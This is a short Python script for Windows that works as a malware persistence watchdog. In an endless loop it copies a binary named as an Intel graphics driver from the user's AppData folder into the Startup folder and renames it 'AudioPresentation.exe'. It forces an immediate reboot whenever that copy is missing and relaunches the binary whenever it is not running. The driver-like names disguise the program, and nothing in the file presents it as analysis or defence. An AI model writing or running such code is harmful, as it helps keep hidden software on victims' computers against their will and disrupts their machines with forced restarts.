import psutil
import os
import getpass
user = getpass.getuser()
startup = "C:\\Users\\"+user+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
nhanban = "C:\\Users\\"+user+"\\AppData"
def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False
while True:
    try:
        check_startup = os.path.exists(startup+"\\AudioPresentation.exe")
        if check_startup == False:
            os.system("copy "+nhanban+"\\MyDrivers\\IntelGraphicsCommandDrivers.exe "+'"'+startup+'"')
            os.system("rename "+'"'+startup+"\\IntelGraphicsCommandDrivers.exe"+'"'+" "+"AudioPresentation.exe")
            os.system("shutdown -r -t 1")
        if checkIfProcessRunning("AudioPresentation.exe")== False:
            run = startup+"\\AudioPresentation.exe"
            os.system('"'+run+'"')
    except:
        pass